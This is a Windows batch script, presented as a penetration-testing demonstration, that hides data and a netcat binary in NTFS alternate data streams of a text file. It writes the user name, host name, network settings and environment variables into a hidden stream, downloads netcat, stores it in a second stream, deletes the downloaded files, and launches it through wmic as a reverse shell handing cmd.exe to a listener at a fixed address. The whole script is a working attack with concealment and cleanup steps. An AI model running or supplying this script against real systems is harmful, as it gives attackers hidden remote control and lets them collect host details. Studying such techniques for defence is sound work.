@echo off
REM This script demonstrates the following scenario
REM - PENTESTER is running a netcat listener on the remote_host and remote_port below
REM - Victim is Windows 10 with NTFS and executes this script

set remote_host=192.168.86.196
set remote_port=80

REM Create a normal text file with some data in it in the current directory
echo "this is normal data" > normal.txt

REM Add some secret data to stream1
whoami && hostname && ipconfig && set > normal.txt:stream1 

REM Let's make another alternate data stream for the same file but
REM use a binary this time, and then execute it to create a reverse shell

REM Download netcat for windows 
curl https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip -o nc.zip

REM extract it using powershell
powershell Expand-Archive -Force nc.zip .\nc

REM copy the 64 bit executable to stream2
type %cd%\nc\nc64.exe > normal.txt:stream2

REM clean up the downloaded and extracted files 
del %cd%\nc.zip
rmdir /S /Q %cd%\nc

REM use wmic to start a process using netcat stored in stream2
REM connect back to the pen tester host that is listening and provide access to cmd.exe shell 
wmic process call create "%cd%\normal.txt:stream2 -nv %remote_host% %remote_port% -e cmd.exe"

REM pen tester can now use the reverse shell to navigate and execute commands on the victim
REM pen tester can grab secret info from normal.txt:stream1 (or this could be index.html:stream1 for example)

cls
echo "Started reverse shell back to %remote_host%"
echo "-list streams with: dir /R"
echo "-view stream1: more < normal.txt:stream1"
echo "-open normal.txt in notepad to see normal data"
echo " "